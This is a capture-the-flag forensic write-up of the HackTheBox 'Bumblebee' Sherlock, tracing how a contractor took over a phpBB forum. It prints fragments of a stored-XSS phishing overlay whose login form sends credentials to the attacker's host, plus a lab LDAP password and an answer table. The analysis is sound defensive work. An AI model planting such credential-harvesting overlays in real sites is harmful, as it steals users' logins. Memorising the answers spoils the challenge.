# [Bumblebee](https://app.hackthebox.com/sherlocks/Bumblebee) - HackTheBox Sherlock Writeup

```
Sherlock    : Bumblebee
Category    : DFIR
Difficulty  : Easy
```

---

## Scenario

An external contractor connected to Forela's internal phpBB forum over the
**guest Wi-Fi** network and somehow walked away with the administrator's
credentials. The provided evidence is a `.tgz` containing:

- `access.log`: the forum's web server access log
- `phpbb.sqlite3`: a full database dump of the forum

The goal: reconstruct exactly how a guest-network contractor escalated to
forum administrator, and what they did with that access.

---

## 0. Setup

```bash
$ wget 'https://labs.hackthebox.com/api/v4/challenges/554/cdn/....' -O bumblebee.zip
$ unzip bumblebee.zip
  inflating: incident.tgz
$ tar xvf incident.tgz
./phpbb.sqlite3
access.log
```

## 1. Identifying the Contractor

Let's look inside the database with some basic SQL:

```sql
$ sqlite3 phpbb.sqlite3
sqlite> .tables

...
phpbb_acl_groups
phpbb_ext
phpbb_config
phpbb_config_text
phpbb_log
phpbb_login_attempts
phpbb_posts
phpbb_users
...

sqlite> .schema  phpbb_posts
CREATE TABLE `phpbb_posts` (
  `post_id` integer  NOT NULL PRIMARY KEY AUTOINCREMENT
,  `poster_id` integer  NOT NULL DEFAULT 0
,  `icon_id` integer  NOT NULL DEFAULT 0
,  `poster_ip` varchar(40) NOT NULL DEFAULT ''
,  `post_username` varchar(255) NOT NULL DEFAULT ''
,  `post_subject` varchar(255) NOT NULL DEFAULT ''
,  `post_text` mediumtext NOT NULL
....
);


sqlite> SELECT user_id, username, user_email, user_ip FROM phpbb_users;

user_id  username    user_email               user_ip
-------  ----------  -----------------------  ------------
     2   admin       admin@forela.co.uk       10.255.254.2
    48   phpbb-admin phpbb-admin@mailinator..  10.255.254.2
    51   apoole      apoole@contractor.net    10.10.0.78
    52   apoole1     apoole1@contractor.net   10.10.0.78
```

Two accounts, `apoole` and `apoole1`, were registered using a contractor mail
domain. They registered from the IP address **`10.10.0.78`**.

## 2. The Malicious Post

Now let's look at what posts they made:

```sql
sqlite> SELECT post_id, post_subject, post_text FROM phpbb_posts WHERE poster_id = 52;
```

Post **`#9`**, titled *"Hello Everyone"*, contains inline `<style>` and
`<script>` blocks rather than ordinary forum content:

```html
<div><style>
body { z-index: 100; }
.modal { position:fixed; top:0; left:0; height:100%; width:100%;
         z-index:101; background-color:white; opacity:1; }
.modal.hidden { visibility: hidden; }
</style><script type="text/javascript">function sethidden(){ ... }
```

Extracting the full post for review:

```bash
$ sqlite3 -line phpbb.sqlite3 \
  "SELECT post_id, post_subject, post_text FROM phpbb_posts WHERE poster_id=52;" \
  > posts_52.txt
```

Inside it, a fake login form:

```html
<form action="http://10.10.0.78/update.php" method="post" id="login"
      data-focus="username" target="hiddenframe">
```

The post rendered a full-screen modal overlay that looked like the forum's
own login page. On submit, it POSTed credentials straight to a server
under the contractor's control, at `http://10.10.0.78/update.php`.
Combined with the `z-index`/full-viewport CSS, this is effectively a
self-hosted phishing overlay planted as ordinary forum content: anyone
viewing the thread (including the real administrator) would be prompted to
"log back in," and would unknowingly hand their credentials to the attacker.

## 3. From Phishing to Admin Takeover

Let's see when the attacker logged in as admin:

```sql
sqlite> SELECT datetime(log_time, 'unixepoch'), log_operation
        FROM phpbb_log WHERE log_ip = '10.10.0.78';
```

```
datetime               log_operation
----------------------  ----------------------
2023-04-26 10:53:12     LOG_ADMIN_AUTH_SUCCESS
2023-04-26 10:53:51     LOG_USERS_ADDED
2023-04-26 10:54:31     LOG_DB_BACKUP
```

1. **10:53:12 UTC**: the attacker authenticates to the admin panel from
   `10.10.0.78`, using the credentials harvested through the phishing overlay
   a short time earlier.
2. **10:53:51 UTC**: the attacker escalates persistence by adding an account
   to the **Administrators** group:

   ```sql
   log_data: a:2:{i:0;s:14:"Administrators";i:1;s:6:"apoole";}
   ```

   The account promoted is `apoole` (user ID 51).
3. **10:54:31 UTC**: a full database backup is triggered (`LOG_DB_BACKUP`),
   most likely to produce a complete, up-to-date export of the forum data
   for exfiltration.

Let's check the user agent by looking at `access.log`:

```bash
$ grep "10.10.0.78" access.log | grep "26/Apr/2023" | grep admin
10.10.0.78 - - [26/Apr/2023:11:53:12 +0100] "GET /adm/style/admin.css ..."
"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0"
```

Let's check which user agent the legitimate admin uses, for comparison.
First, find the legitimate admin's IP address:

```sql
sqlite> SELECT datetime(log_time, 'unixepoch'), log_ip
        FROM phpbb_log WHERE log_operation = 'LOG_ADMIN_AUTH_SUCCESS';
```

```
2023-04-25 11:09:07   10.255.254.2   (legitimate, internal range)
2023-04-26 10:53:12   10.10.0.78     (attacker, guest range)
```

```bash
$ grep "10.255.254.2" access.log | head -n 1
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 ... Chrome/112.0.0.0 Safari/537.36"
```

A completely different device and browser fingerprint (macOS + Chrome,
versus the attacker's Windows + Firefox), corroborating that the
`10.10.0.78` session was phished rather than used by its rightful owner.

## 4. Exfiltration

In the log files we can also see that the attacker downloaded the full
database backup generated moments earlier:

```bash
$ cat access.log | grep "backup"
10.10.0.78 - - [26/Apr/2023:12:01:38 +0100]
"GET /store/backup_1682506471_dcsr71p7fyijoyq8.sql.gz HTTP/1.1" 200 34707
```

## 5. LDAP Credentials

We know the forum uses LDAP in the backend. Let's check whether the
attacker, who now has the complete database, also obtained the LDAP
credentials.

```bash
$ sqlite3 phpbb.sqlite3 .dump | grep -i "ldap"
INSERT INTO phpbb_config VALUES('auth_method','db_or_ldap',0);
INSERT INTO phpbb_config VALUES('ldap_server','10.10.0.11',0);
INSERT INTO phpbb_config VALUES('ldap_user','CN=phpbb-admin,OU=Service,OU=Forela,DC=forela,DC=local',0);
INSERT INTO phpbb_config VALUES('ldap_password','Passw0rd1',0);
```

Since the attacker exfiltrated the entire database, the service account
password for Forela's Active Directory domain must be treated as
compromised too.

## Findings Summary

| # | Question | Answer |
|---|---|---|
| 1 | Contractor's username | `apoole1` |
| 2 | Contractor's registration IP | `10.10.0.78` |
| 3 | ID of the malicious post | `9` |
| 4 | Credential-stealer POST target | `http://10.10.0.78/update.php` |
| 5 | Admin login time (attacker, UTC) | `26/04/2023 10:53:12` |
| 6 | LDAP bind password (plaintext) | `Passw0rd1` |
| 7 | Attacker's user agent | Firefox 112 / Windows 10 |
| 8 | Legitimate admin's user agent | Chrome 112 / macOS |
| 9 | Time self-promoted to Administrators (UTC) | `26/04/2023 10:53:51` |
| 10 | Time DB backup downloaded (UTC) | `26/04/2023 11:01:38` |
| 11 | Size of exfiltrated backup | `34707` bytes |

## Attack Timeline (UTC)

```
10:53:12  Attacker authenticates to /adm as admin (phished credentials)
10:53:51  Attacker adds account 'apoole' to Administrators group
10:54:31  Attacker triggers a full database backup
11:01:38  Attacker downloads the backup (34,707 bytes)
```

## Lessons Learned

**For defenders:**

- **Network segmentation is not a trust boundary on its own.** Guest Wi-Fi
  access to an internal application let a contractor interact with the forum
  at all; a genuinely isolated guest network would not have reached it.
- **Allowing raw HTML/JS in user-submitted content is a direct path to stored
  XSS/phishing.**
- **Secrets in application config tables are secrets in every backup of that
  table.** The LDAP service account password sat in `phpbb_config` in
  plaintext. Credentials used by applications should be stored in a secrets
  manager, not in-database.

**What I learned**

- I became familiar with the structure of a phpBB forum.

**Tools I used**

- sqlite3
